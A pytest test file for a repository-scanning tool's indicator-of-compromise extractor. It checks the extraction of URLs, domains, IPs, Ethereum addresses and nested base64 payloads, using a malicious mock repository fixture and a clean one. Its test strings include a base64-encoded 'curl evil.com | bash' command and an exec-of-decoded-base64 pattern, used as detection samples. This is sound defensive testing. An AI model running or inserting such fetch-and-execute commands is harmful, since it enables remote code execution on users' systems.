"""
Tests for ioc_extractor module — Module 4.

Loads FlexPay and clean repo fixtures from disk. Tests IOC extraction
patterns, base64 recursion, optional VT enrichment. No network calls.
"""

import os
from unittest.mock import Mock

from repo_guard.models import Severity
from repo_guard.modules.ioc_extractor import (
    scan,
    _extract_urls,
    _extract_domains,
    _extract_eth_addresses,
    _extract_ips,
    _extract_base64_blobs,
    _decode_base64,
    _is_text_file,
)

FIXTURES_DIR = os.path.join(os.path.dirname(__file__), "fixtures")
FLEXPAY_DIR = os.path.join(FIXTURES_DIR, "flexpay_mock")
CLEAN_DIR = os.path.join(FIXTURES_DIR, "clean_repo")


def _load_fixture_file(relative_path: str, base_dir: str) -> str:
    file_path = os.path.join(base_dir, relative_path)
    with open(file_path, "r") as f:
        return f.read()


# ---------------------------------------------------------------------------
# Text file detection
# ---------------------------------------------------------------------------


class TestIsTextFile:
    def test_python_file_is_text(self):
        assert _is_text_file("src/main.py") is True
        assert _is_text_file("setup.py") is True

    def test_markdown_file_is_text(self):
        assert _is_text_file("README.md") is True

    def test_json_file_is_text(self):
        assert _is_text_file(".vscode/tasks.json") is True
        assert _is_text_file("package.json") is True

    def test_shell_file_is_text(self):
        assert _is_text_file(".githooks/post-checkout") is True
        assert _is_text_file("deploy.sh") is True

    def test_binary_extensions_are_not_text(self):
        assert _is_text_file("image.png") is False
        assert _is_text_file("archive.zip") is False
        assert _is_text_file("binary.bin") is False
        assert _is_text_file("font.woff2") is False

    def test_no_extension_is_not_text_by_default(self):
        assert _is_text_file("Makefile") is True  # in ALWAYS_TEXT_PATHS
        assert _is_text_file("somefile") is False


# ---------------------------------------------------------------------------
# IOC extraction helpers
# ---------------------------------------------------------------------------


class TestExtractUrls:
    def test_basic_urls(self):
        text = "Visit https://evil.com/payload or http://example.com"
        urls = _extract_urls(text)
        assert "https://evil.com/payload" in urls
        assert "http://example.com" in urls

    def test_no_urls(self):
        assert _extract_urls("Just some text without URLs") == []

    def test_multiple_urls(self):
        text = "a https://a.com b https://b.com c https://a.com"
        urls = _extract_urls(text)
        assert len(urls) == 2


class TestExtractDomains:
    def test_basic_domains(self):
        text = "Contact devops@flexpay.io or visit evil.com"
        domains = _extract_domains(text)
        assert "flexpay.io" in domains
        assert "evil.com" in domains

    def test_excludes_ips(self):
        text = "server at 192.168.1.1"
        domains = _extract_domains(text)
        assert "192.168.1.1" not in domains

    def test_no_domains(self):
        assert _extract_domains("no dots here") == []


class TestExtractEthAddresses:
    def test_valid_eth_address(self):
        addr = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
        result = _extract_eth_addresses(addr)
        assert len(result) == 1
        assert result[0] == addr  # Preserves case

    def test_mixed_case(self):
        addr = "0xABCDEF0123456789abcdef0123456789abcdef01"
        result = _extract_eth_addresses(addr)
        assert len(result) == 1

    def test_no_addresses(self):
        assert _extract_eth_addresses("no addresses here") == []

    def test_wrong_length_ignored(self):
        text = "0x1234"  # Too short
        assert _extract_eth_addresses(text) == []


class TestExtractIps:
    def test_valid_ip(self):
        assert _extract_ips("connect to 10.0.0.1") == ["10.0.0.1"]

    def test_invalid_octet_ignored(self):
        assert _extract_ips("bad ip 999.999.999.999") == []

    def test_no_ips(self):
        assert _extract_ips("no numbers here") == []


class TestExtractBase64Blobs:
    def test_valid_base64_detected(self):
        import base64
        payload = base64.b64encode(b"import os; os.system('ls')").decode()
        text = f"exec(base64.b64decode('{payload}'))"
        blobs = _extract_base64_blobs(text)
        assert len(blobs) >= 1
        assert payload in blobs

    def test_short_strings_ignored(self):
        text = "abc123"  # Too short (6 chars)
        blobs = _extract_base64_blobs(text)
        assert len(blobs) == 0

    def test_hex_strings_ignored(self):
        text = "a" * 30  # Looks like hex
        blobs = _extract_base64_blobs(text)
        assert len(blobs) == 0

    def test_invalid_base64_ignored(self):
        text = "!!!!invalid!!!!base64!!!!string!!!!"
        blobs = _extract_base64_blobs(text)
        assert len(blobs) == 0


class TestDecodeBase64:
    def test_single_level(self):
        import base64
        payload = "import os; os.system('curl evil.com | bash')"
        encoded = base64.b64encode(payload.encode()).decode()
        text = f"encoded_payload = '{encoded}'"
        decoded = _decode_base64(text)
        assert len(decoded) >= 1
        assert "curl evil.com" in decoded[0]

    def test_max_depth(self):
        """Nested base64 should not exceed recursion limit."""
        import base64
        inner = "hello world"
        for _ in range(4):  # Nest beyond limit
            inner = base64.b64encode(inner.encode()).decode()
        decoded = _decode_base64(inner)
        # Should not crash and should return at most 3 levels
        assert len(decoded) <= 3

    def test_empty_returns_empty(self):
        assert _decode_base64("") == []


# ---------------------------------------------------------------------------
# FlexPay fixture — should find IOCs
# ---------------------------------------------------------------------------


class TestIocExtractorFlexPay:
    """FlexPay fixture has URLs, base64 payloads, domains, etc."""

    def _make_flexpay_tree(self):
        return [
            {"path": "README.md", "type": "blob", "sha": "a", "size": 50},
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "b", "size": 500},
            {"path": ".vscode/tasks.json", "type": "blob", "sha": "c", "size": 200},
            {"path": ".vscode/settings.json", "type": "blob", "sha": "d", "size": 100},
        ]

    def _make_flexpay_client(self):
        client = Mock()
        client.get_tree.return_value = self._make_flexpay_tree()

        def side_effect(o, r, path):
            if path == "README.md":
                return _load_fixture_file("README.md", FLEXPAY_DIR)
            elif path == ".githooks/post-checkout":
                return _load_fixture_file(".githooks/post-checkout", FLEXPAY_DIR)
            elif path == ".vscode/tasks.json":
                return _load_fixture_file(".vscode/tasks.json", FLEXPAY_DIR)
            elif path == ".vscode/settings.json":
                return _load_fixture_file(".vscode/settings.json", FLEXPAY_DIR)
            return None

        client.get_file_content.side_effect = side_effect
        return client

    def test_flexpay_finds_urls(self):
        result = scan(self._make_flexpay_client(), "flexpay", "repo", vt_key=None)
        iocs = result.raw_data.get("iocs", {})
        urls = iocs.get("urls", [])
        # FlexPay fixture has URLs in tasks.json and post-checkout.
        assert len(urls) >= 1, f"Expected URLs, got: {urls}"

    def test_flexpay_finds_base64_payloads(self):
        result = scan(self._make_flexpay_client(), "flexpay", "repo", vt_key=None)
        iocs = result.raw_data.get("iocs", {})
        b64 = iocs.get("base64_payloads", [])
        assert len(b64) >= 1, f"Expected base64 payloads, got: {b64}"

    def test_flexpay_returns_warning(self):
        """FlexPay has enough IOCs to trigger WARNING."""
        result = scan(self._make_flexpay_client(), "flexpay", "repo", vt_key=None)
        assert result.severity in (Severity.WARNING, Severity.CRITICAL)

    def test_flexpay_no_vt_note_included(self):
        """Without vt_key, the enrichment note should appear."""
        result = scan(self._make_flexpay_client(), "flexpay", "repo", vt_key=None)
        note_findings = [f for f in result.findings if "VirusTotal" in f.message]
        assert len(note_findings) >= 1

    def test_flexpay_with_vt_key_skips_note(self):
        """With vt_key provided, the enrichment note should NOT appear."""
        result = scan(self._make_flexpay_client(), "flexpay", "repo", vt_key="fake_vt_key")
        note_findings = [f for f in result.findings if "VirusTotal enrichment not available" in f.message]
        assert len(note_findings) == 0


# ---------------------------------------------------------------------------
# Clean repo fixture — should return CLEAN
# ---------------------------------------------------------------------------


class TestIocExtractorClean:
    """Clean repo has no IOCs."""

    def test_clean_repo_no_iocs(self):
        tree = [
            {"path": "src/main.py", "type": "blob", "sha": "a", "size": 100},
            {"path": ".vscode/settings.json", "type": "blob", "sha": "b", "size": 50},
        ]
        client = Mock()
        client.get_tree.return_value = tree

        def side_effect(o, r, path):
            if path == "src/main.py":
                return _load_fixture_file("src/main.py", CLEAN_DIR)
            elif path == ".vscode/settings.json":
                return _load_fixture_file(".vscode/settings.json", CLEAN_DIR)
            return None

        client.get_file_content.side_effect = side_effect

        result = scan(client, "owner", "clean-repo", vt_key=None)
        assert result.severity == Severity.CLEAN
        assert result.raw_data.get("iocs", {}).get("urls") == []

    def test_empty_repo_returns_clean(self):
        client = Mock()
        client.get_tree.return_value = []
        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN

    def test_tree_fetch_failure_returns_info(self):
        client = Mock()
        client.get_tree.side_effect = Exception("API error")
        result = scan(client, "o", "r")
        assert result.severity == Severity.INFO
        assert "Could not fetch" in result.findings[0].message
